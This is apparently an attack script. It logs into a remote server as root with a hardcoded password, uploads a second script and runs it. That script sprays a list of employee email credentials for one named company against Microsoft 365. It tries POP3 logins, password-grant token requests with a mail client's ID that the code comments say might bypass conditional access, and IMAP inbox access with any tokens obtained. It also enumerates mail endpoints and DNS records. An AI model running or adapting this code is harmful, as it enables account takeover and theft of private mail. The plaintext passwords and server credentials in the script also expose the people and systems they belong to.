import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = """
import requests, urllib3, json, sys, time, base64, smtplib, imaplib, poplib, socket
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

CREDS = [
    ("jsanchezfern@findep.global", "AFI2022*"),
    ("bemedezar@findep.global", "AFI2022*"),
    ("admin@findep.global", "4dm1n##*2411"),
    ("admin@findep.global", "BcF1s42o2d*"),
    ("mmartinez@findep.global", "Rul76846"),
    ("jeff@findep.global", "AFI2022*"),
    ("bmendezar@findep.global", "Pao1234+"),
    ("bmendezar@findep.dev", "Pao1234+"),
    ("hgarciaar@findep.global", "Pao1234+"),
    ("hgarciaar@findep.dev", "Pao1234+"),
]

# ========================================
# 1. THUNDERBIRD AUTOCONFIG DISCOVERY
# ========================================
sys.stdout.write("=== AUTOCONFIG DISCOVERY ===\\n\\n")

domains = ["findep.global", "findep.dev", "findep.com.mx", "findep.mx"]
for d in domains:
    urls = [
        "https://autoconfig." + d + "/mail/config-v1.1.xml",
        "http://autoconfig." + d + "/mail/config-v1.1.xml",
        "https://" + d + "/.well-known/autoconfig/mail/config-v1.1.xml",
        "https://autodiscover." + d + "/autodiscover/autodiscover.xml",
    ]
    for url in urls:
        try:
            r = requests.get(url, headers={"User-Agent": UA}, verify=False, timeout=8, allow_redirects=True)
            if r.status_code == 200 and len(r.text) > 100:
                sys.stdout.write("[" + str(r.status_code) + "] " + url + " (" + str(len(r.text)) + "b)\\n")
                sys.stdout.write("  " + r.text[:500].replace("\\n", " ") + "\\n\\n")
            else:
                sys.stdout.write("[" + str(r.status_code) + "] " + url + "\\n")
        except Exception as e:
            sys.stdout.write("[ERR] " + url + " — " + str(e)[:40] + "\\n")
    sys.stdout.write("\\n")
    sys.stdout.flush()

# ========================================
# 2. MS AUTODISCOVER V2 (JSON — what Thunderbird + Outlook use)
# ========================================
sys.stdout.write("\\n=== MS AUTODISCOVER V2 ===\\n\\n")

for email, _ in CREDS[:6]:
    for proto in ["AutodiscoverV1", "ActiveSync", "Ews", "Rest", "Substrate", "SubstrateNotificationService"]:
        try:
            url = "https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/" + email + "?Protocol=" + proto
            r = requests.get(url, headers={"User-Agent": UA}, verify=False, timeout=8)
            if r.status_code == 200:
                sys.stdout.write("  [200] " + email + " " + proto + " → " + r.text[:200] + "\\n")
        except:
            pass
    sys.stdout.flush()
    break  # only need one email to discover endpoints

# ========================================
# 3. AUTODISCOVER V1 (SOAP — reveals on-prem exchange)
# ========================================
sys.stdout.write("\\n=== AUTODISCOVER V1 SOAP ===\\n\\n")

for email, pw in CREDS[:4]:
    ab = base64.b64encode((email + ":" + pw).encode()).decode()
    soap_ad = '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">'
    soap_ad += '<Request><EMailAddress>' + email + '</EMailAddress>'
    soap_ad += '<AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>'
    soap_ad += '</Request></Autodiscover>'
    
    try:
        r = requests.post("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml",
            headers={"Authorization": "Basic " + ab, "Content-Type": "text/xml", "User-Agent": UA},
            data=soap_ad, verify=False, timeout=10)
        sys.stdout.write("[" + str(r.status_code) + "] " + email + " autodiscover.xml (" + str(len(r.text)) + "b)\\n")
        if r.status_code == 200 and ("Protocol" in r.text or "Server" in r.text):
            sys.stdout.write("  " + r.text[:500] + "\\n")
    except Exception as e:
        sys.stdout.write("[ERR] " + email + " — " + str(e)[:40] + "\\n")
    time.sleep(1)
    sys.stdout.flush()

# ========================================
# 4. POP3 (outlook.office365.com:995)
# ========================================
sys.stdout.write("\\n=== POP3 SSL ===\\n\\n")

for email, pw in CREDS[:6]:
    try:
        pop = poplib.POP3_SSL("outlook.office365.com", 995, timeout=10)
        pop.user(email)
        resp = pop.pass_(pw)
        sys.stdout.write("*** POP3 HIT *** " + email + ":" + pw + " — " + resp.decode() + "\\n")
        stat = pop.stat()
        sys.stdout.write("  Messages: " + str(stat[0]) + " Size: " + str(stat[1]) + "\\n")
        pop.quit()
    except Exception as e:
        err = str(e)[:80]
        sys.stdout.write("  POP3 " + email + " — " + err + "\\n")
    time.sleep(1)
    sys.stdout.flush()

# ========================================
# 5. THUNDERBIRD OAUTH2 CLIENT_ID (device code flow)
# ========================================
sys.stdout.write("\\n=== THUNDERBIRD OAUTH2 DEVICE CODE FLOW ===\\n\\n")

# Thunderbird's registered OAuth2 client_id for Microsoft
TB_CLIENT = "9e5f94bc-e8a4-4e73-b8be-63364c29d753"
TENANT_GLOBAL = "30fcec21-d05d-4ca6-8233-a90183fc7dbd"
TENANT_DEV = "d37bcda5-7136-468e-a984-4a47aa1468aa"

for tenant, tname in [(TENANT_GLOBAL, "findep.global"), (TENANT_DEV, "findep.dev"), ("organizations", "organizations")]:
    try:
        r = requests.post("https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/devicecode",
            data={
                "client_id": TB_CLIENT,
                "scope": "https://outlook.office365.com/IMAP.AccessAsUser.All https://outlook.office365.com/SMTP.Send offline_access"
            }, timeout=10)
        if r.status_code == 200:
            data = r.json()
            sys.stdout.write("DEVICE CODE (" + tname + "):\\n")
            sys.stdout.write("  User code: " + data.get("user_code", "?") + "\\n")
            sys.stdout.write("  URL: " + data.get("verification_uri", "?") + "\\n")
            sys.stdout.write("  Device code: " + data.get("device_code", "?")[:50] + "...\\n")
            sys.stdout.write("  Expires: " + str(data.get("expires_in", "?")) + "s\\n")
            sys.stdout.write("  Message: " + data.get("message", "?") + "\\n\\n")
        else:
            sys.stdout.write("[" + str(r.status_code) + "] " + tname + " — " + r.text[:200] + "\\n")
    except Exception as e:
        sys.stdout.write("ERR " + tname + " — " + str(e)[:40] + "\\n")
    sys.stdout.flush()

# ========================================
# 6. ROPC WITH THUNDERBIRD CLIENT (might bypass conditional access)
# ========================================
sys.stdout.write("\\n=== ROPC WITH THUNDERBIRD CLIENT_ID ===\\n\\n")

ropc_creds = [
    ("jsanchezfern@findep.global", "AFI2022*", TENANT_GLOBAL),
    ("admin@findep.global", "4dm1n##*2411", TENANT_GLOBAL),
    ("admin@findep.global", "BcF1s42o2d*", TENANT_GLOBAL),
    ("bemedezar@findep.global", "AFI2022*", TENANT_GLOBAL),
    ("mmartinez@findep.global", "Rul76846", TENANT_GLOBAL),
    ("jsanchezfern@findep.dev", "AFI2022*", TENANT_DEV),
    ("mmartinez@findep.dev", "Rul76846", TENANT_DEV),
    ("jeff@findep.dev", "AFI2022*", TENANT_DEV),
]

for email, pw, tenant in ropc_creds:
    try:
        r = requests.post("https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/token",
            data={
                "grant_type": "password",
                "client_id": TB_CLIENT,
                "username": email,
                "password": pw,
                "scope": "https://outlook.office365.com/IMAP.AccessAsUser.All https://outlook.office365.com/SMTP.Send offline_access"
            }, timeout=10)
        if r.status_code == 200:
            sys.stdout.write("*** ROPC HIT (TB) *** " + email + ":" + pw + "\\n")
            td = r.json()
            at = td.get("access_token", "")
            # Use token for IMAP XOAUTH2
            if at:
                sys.stdout.write("  Got token! Trying IMAP XOAUTH2...\\n")
                try:
                    im = imaplib.IMAP4_SSL("outlook.office365.com", 993, timeout=10)
                    auth_string = "user=" + email + "\\x01auth=Bearer " + at + "\\x01\\x01"
                    im.authenticate("XOAUTH2", lambda x: auth_string.encode())
                    sys.stdout.write("  *** IMAP XOAUTH2 SUCCESS ***\\n")
                    st, mbs = im.list()
                    for m in (mbs or [])[:5]:
                        sys.stdout.write("    " + m.decode(errors="replace")[:60] + "\\n")
                    im.select("INBOX")
                    st, msgs = im.search(None, "ALL")
                    ids = msgs[0].split() if msgs[0] else []
                    sys.stdout.write("    Inbox: " + str(len(ids)) + " msgs\\n")
                    im.logout()
                except Exception as e:
                    sys.stdout.write("  IMAP XOAUTH2 err: " + str(e)[:60] + "\\n")
        else:
            ed = r.json().get("error_description", "")[:100]
            tag = ""
            if "50053" in ed: tag = "[LOCKED]"
            elif "50034" in ed: tag = "[NOT FOUND]"
            elif "50126" in ed: tag = "[BAD PW]"
            elif "50076" in ed or "50079" in ed: tag = "[MFA-PW VALID!]"
            elif "65001" in ed: tag = "[APP NOT CONSENTED]"
            elif "7000218" in ed: tag = "[ROPC BLOCKED FOR CLIENT]"
            sys.stdout.write("  " + tag + " " + email + ":" + pw + "\\n")
    except Exception as e:
        sys.stdout.write("  ERR " + email + " — " + str(e)[:40] + "\\n")
    time.sleep(2)
    sys.stdout.flush()

# ========================================
# 7. MX RECORDS — check if there's on-prem exchange
# ========================================
sys.stdout.write("\\n=== DNS MX RECORDS ===\\n\\n")

import subprocess
for d in ["findep.global", "findep.dev", "findep.com.mx", "findep.mx"]:
    try:
        r = subprocess.run(["dig", "+short", "MX", d], capture_output=True, text=True, timeout=5)
        mx = r.stdout.strip()
        sys.stdout.write(d + " MX: " + (mx if mx else "(none)") + "\\n")
    except:
        try:
            r = subprocess.run(["nslookup", "-type=MX", d], capture_output=True, text=True, timeout=5)
            sys.stdout.write(d + " MX: " + r.stdout[:200] + "\\n")
        except Exception as e:
            sys.stdout.write(d + " MX ERR: " + str(e)[:40] + "\\n")
    
    # Also check autodiscover CNAME
    try:
        r = subprocess.run(["dig", "+short", "CNAME", "autodiscover." + d], capture_output=True, text=True, timeout=5)
        ad = r.stdout.strip()
        if ad:
            sys.stdout.write("  autodiscover." + d + " CNAME: " + ad + "\\n")
    except:
        pass
    sys.stdout.flush()

sys.stdout.write("\\n=== DONE ===\\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/thunderbird_test.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/thunderbird_test.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 240:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
